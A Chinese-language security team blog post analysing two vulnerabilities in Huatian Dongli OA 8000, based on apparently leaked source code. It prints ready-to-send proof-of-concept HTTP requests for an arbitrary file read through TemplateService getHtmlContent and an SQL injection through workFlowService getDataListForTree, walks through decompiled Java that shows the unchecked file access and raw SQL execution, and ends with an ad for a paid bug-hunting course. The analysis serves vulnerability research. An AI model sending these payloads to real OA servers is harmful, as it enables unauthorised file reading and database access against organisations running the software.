#  华天动力OA Service漏洞分析两则   
原创 chobits02  Code4th安全团队   2025-01-07 06:57  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/EXTCGqBpVJQGQG6ibYpsQ9hibUNQ9JogaBM4ETcLDdyuTknYvxjLbGCEQFKUEwbwpummEIZzqUcA3Mhaj6yJqd9Q/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
  
偶然  
获得了华天OA的一部分源码，查看对应的版本为华天动力OA 8000，这里结合漏洞来分析下如何根据茫茫大海般的源码，来分析漏洞产生点。  
  
华天动力是我国首批OA企业,是双软认证的高新技术企业,专注OA办公系统20余年,开放免费OA系统下载试用,旗下OA产品累计为37500多个客户提供高效OA办公体验。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSXibibMQerDB0Pazwj6KpicznxLeNM2UficKmYLB2RqicwR0HWcYxHiavADQ2C6xEUSM07EGot7GgkPdIg/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞分析其一  
  
任意文件读取漏洞，对应的poc如下  
```
POST /OAapp/bfapp/buffalo/TemplateService HTTP/1.1
Content-Type: text/xml
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Host: 
Content-Length: 101
Expect: 100-continue
Connection: close
<buffalo-call>
<method>getHtmlContent</method>
<string>c:/windows/win.ini</string>
</buffalo-call>
```  
  
请求路径  
bfapp/buffalo  
是后端服务的地址，无法在静态路径中找到对应方法  
  
所以需要在配置文件buffalo-service.properties里面查询对应的Service名称和包名称，  
TemplateService  
对应的包名称如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSXibibMQerDB0Pazwj6Kpiczn7Dzwia2CGvkUvMm3qekn4qjaOoEI95OI9s6f1Sw1Q3usbaK2LWsDM6Q/640?wx_fmt=png&from=appmsg "")  
  
找到对应的jar包进行反编译，对应代码如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSXibibMQerDB0Pazwj6Kpiczn4dTS0KldwX2xzYUKL5XDE8iaKFhANtuXBEKc42nfJX5q9XHVP90wefw/640?wx_fmt=png&from=appmsg "")  
  
对应方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSXibibMQerDB0Pazwj6KpicznSczm02dwtuHY4bSxLa6ibTGwwtqibZMQHoLTUrTCNiaibjHjvvzrVQDHkA/640?wx_fmt=png&from=appmsg "")  
  
```
/*      */   public String getHtmlContent(String htmlFileName) {
/*  768 */     if (htmlFileName == null) return null; 
/*  769 */     return OaTools.getFileContent(htmlFileName, this.sysInfo.getCharSet());
/*      */   }
```  
  
其中的OaTools方法导入自这个包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSXibibMQerDB0Pazwj6Kpicznc190HBqboSFvxcB02ZCTic72DrehuIjmaU6ryaMQFE63eoqm5NgcGNQ/640?wx_fmt=png&from=appmsg "")  
  
  
对应jar包为oaapp_base.jar，但是没有找到这个方法。搜索了一下，最后在cnpower.jar的OaBaseTools里面找到了同样的getFileContent方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSXibibMQerDB0Pazwj6KpicznyAISKibP4tVSKu8fN9tf0ubjU3q2aloU9j4L4OljCicYNftMvjib6tOiaw/640?wx_fmt=png&from=appmsg "")  
  
  
  
代码如下：  
```
  public static String getFileContent(String paramString1, String paramString2) {
    File file = new File(paramString1);
    try {
      FileInputStream fileInputStream = new FileInputStream(file);
      byte[] arrayOfByte = new byte[fileInputStream.available()];
      fileInputStream.read(arrayOfByte);
      fileInputStream.close();
      return (paramString2 == null) ? new String(arrayOfByte) : new String(arrayOfByte, paramString2);
    } catch (Exception exception) {
      exception.printStackTrace();
      return null;
    } 
  }
```  
  
其中对应的charSet方法为获取编码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSXibibMQerDB0Pazwj6Kpiczn82HQgGWbNhx2SSPcIe8wCsRpdUHSFsbZXibFtnIeVswhLbgR7ssxKhw/640?wx_fmt=png&from=appmsg "")  
  
方法中第一个传参为文件路径，第二个传参为编码，最后返回文件内容并判断是否编码，然后就能读取任意文件内容  
  
  
漏洞分析其二  
  
  
另外一个是SQL注入漏洞，poc对应如下  
```
POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
Host: xx.xx.xx.xx
Accept-Encoding: identity
Content-Length: 103
Accept-Language: zh-CN,zh;q=0.8
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Connection: keep-alive
Cache-Control: max-age=0
<buffalo-call> 
<method>getDataListForTree</method> 
<string>select user()</string> 
</buffalo-call>
```  
  
继续看下  
workFlowService  
对应的包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSXibibMQerDB0Pazwj6KpicznoauPOGHZbwUIZKTpYOOjIv7mWaQ3o52gpwN8iav5D6Hw7H9WnG9s9mA/640?wx_fmt=png&from=appmsg "")  
  
方法名称知道了，但是不知道在哪个jar包中，findstr搜索方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSXibibMQerDB0Pazwj6KpicznKr5d5TksKNU7bxqZdv2IJthwcxvHHr3I26frsq9pRRMjc63eQkpS6A/640?wx_fmt=png&from=appmsg "")  
  
对应的jar包为appservice.jar  
  
进到代码中查看  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSXibibMQerDB0Pazwj6Kpiczn39gA1iakiayia4gdjj40bia7ibG6WElCnkQNOXlPiabFH1of2HENdNogEjog/640?wx_fmt=png&from=appmsg "")  
  
对应的method为  
getDataListForTree  
，直接搜索  
  
![](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJSXibibMQerDB0Pazwj6KpicznVuzaZEkGmmNVHkRJJCQjUgsSs6iaNibaibUFs5QZiarUFl0pkRudwWuiaag/640?wx_fmt=png&from=appmsg "")  
  
关键代码如下：  
```
/*      */   public List getDataListForTree(String sql) {
/*  927 */     List<HashMap> dataList = null;
/*      */     try {
/*  929 */       dataList = getDatas(sql);
/*  930 */       if (dataList == null || dataList.size() == 0) return dataList; 
/*  931 */     } catch (OaException e) {
/*  932 */       e.printStackTrace();
/*      */     } 
```  
  
传参字符串包含SQL语句，调用getDatas(sql)方法，追踪getDatas  
```
/*      */   public List getDatas(String sql) throws OaException {
/*  889 */     if (sql == null || "".equals(sql)) return new ArrayList();
/*      */     
/*  891 */     Session hiSession = null;
/*      */     
/*      */     try {
/*  894 */       hiSession = TransactionManager.getInstance().getCurrentSession();
/*  895 */       HiOaBaseSQLManager event = new HiOaBaseSQLManager(hiSession);
/*  896 */       return event.executeQuerySQL(sql);
/*  897 */     } catch (Exception e) {
/*  898 */       e.printStackTrace();
/*  899 */       throw new OaException(e.getMessage());
/*      */     } finally {
/*      */       
/*  902 */       if (hiSession != null) {
/*  903 */         hiSession.close();
/*      */       }
/*      */     } 
/*      */   }
```  
  
此处是直接执行了SQL语句，因此造成了SQL注入。至此可以看出漏洞利用都十分的简单  
  
  
  
  
**每个初学挖洞的小白都有一个美梦**  
：是否可以在我学习挖洞技能的时候，有位师傅手把手指导，不仅教会我各种技术，还能带着我一起接项目挣钱，让我的技能和钱包同时“升级打怪”。  
  
    还真别说，现在这个天降大饼的美梦来了！FreeBuf知识大陆帮会《安全渗透感知大家族》，正好为你提供了这样的机会。在这里，你既能  
学到知识  
，又能  
做项目赚钱  
，还能在项目实践过程中与大佬们  
交流思路、夯实基础  
。  
  
[](http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651303102&idx=1&sn=6bd3abdb7109cc66aba29c207220abb3&chksm=bd1c3e358a6bb723efafa4f60e95a264aeea48508f9acef1444e8d5dded986457f046c39e3a2&scene=21#wechat_redirect)  
  
该**SRC漏洞挖掘出洞课程**  
，是由团队内部师傅根据实际挖洞经历整合的适合挖掘漏洞但是缺乏思路、刚接触学习漏洞挖掘不出漏洞的师傅们的漏洞挖掘教程。  
  
第一期课程价格  
199  
，这价格还要什么自行车？课程正在持续更新中~  
  
[](http://mp.weixin.qq.com/s?__biz=MzkzMzE5OTQzMA==&mid=2247485154&idx=1&sn=90f1bce91e53a5bf538bdef11fe15b2d&chksm=c2516dcbf526e4dd6d75254b70743d30902a7f0288d001148a41cc05e2d0b9fb09702d2ea03e&scene=21#wechat_redirect)  
  
**致远A8**  
，又称致远互联A8协同管理软件，是面向中型、大型、集团型组织（集团版OA）的数字化协同运营中台。A8版本的系统小版本较多，本次分析用的是致远A8 V7 SP1版本源码。  
  
[](http://mp.weixin.qq.com/s?__biz=MzkzMzE5OTQzMA==&mid=2247484688&idx=1&sn=928f50f70991a1979dcefb8d02cb02d6&chksm=c2516e39f526e72fae6fe053cf7ab537692bd5581a5552dfe7bfcee0588bd7e5c0d793f2f84b&scene=21#wechat_redirect)  
  
END  
  
  
  
关注Cod  
e4th安全团队  
  
获取更多安全相关内容~  
  
